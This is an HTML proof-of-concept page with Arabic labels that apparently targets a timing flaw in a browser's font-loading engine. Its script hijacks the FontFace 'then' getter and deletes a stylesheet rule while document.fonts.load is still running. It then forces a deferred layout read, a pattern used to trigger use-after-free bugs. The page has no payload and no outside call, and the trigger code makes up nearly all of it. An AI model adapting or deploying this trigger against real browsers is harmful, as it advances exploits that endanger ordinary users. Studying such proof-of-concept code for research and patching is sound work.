<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>فحص الثغرة الأصلية - المرحلة المتقدمة</title>
    <style>
        body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
        #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 350px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
        .log { margin-bottom: 8px; }
        .warn { color: #ffaa00; }
        .error { color: #ff3333; }
        button { background-color: #00ffcc; color: #000; padding: 10px 20px; font-weight: bold; border: none; cursor: pointer; }
    </style>
</head>
<body>

    <h2>مراقبة التوقيت المتقدم (Macro-task Delay)</h2>
    <button onclick="runPoc()">تشغيل فحص التوقيت</button>
    
    <div id="custom-console">[نظام المحاكاة نشط]: جاهز لتتبع الفجوة الزمنية...</div>

    <script>
        const consoleElement = document.getElementById('custom-console');
        function screenLog(msg, isWarn = false) {
            const entry = document.createElement('div');
            entry.className = isWarn ? 'log warn' : 'log';
            entry.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            consoleElement.appendChild(entry);
            consoleElement.scrollTop = consoleElement.scrollHeight;
        }

        function runPoc() {
            screenLog("بدء إعداد البيئة الهيكلية...");
            
            const style = document.createElement('style');
            style.id = "s";
            document.head.appendChild(style);
            style.sheet.insertRule("@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }", 0);

            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);
            void A.loaded;

            let fired = false;

            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    if (!fired && this === A) {
                        fired = true;
                        screenLog("!! تم رصد المقاطعة المنطقية !!", true);
                        
                        new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                        new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                        
                        try {
                            document.getElementById('s').sheet.deleteRule(0);
                            screenLog("تم إرسال أمر حذف القاعدة.");
                        } catch(e) { screenLog("خطأ أثناء الحذف: " + e.message, true); }
                        
                        // التعديل الهندسي: ترحيل القراءة إلى الـ Macro-task Queue لكسر تمسك المكدس
                        setTimeout(() => {
                            screenLog("محاولة القراءة المؤجلة (offsetTop) بعد تفريغ المكدس الأصلي...");
                            let offset = document.body.offsetTop;
                            screenLog("قيمة الـ Offset المسترجعة بعد التأجيل: " + offset);
                        }, 0);
                    }
                    
                    return function(resolve) { if (resolve) resolve(); };
                }
            });

            screenLog("استدعاء document.fonts.load الحالي...");
            document.fonts.load('1em x', 'AB');
        }

        window.onerror = function(msg) {
            screenLog("استثناء في النظام: " + msg, true);
            return true;
        };
    </script>
</body>
</html>
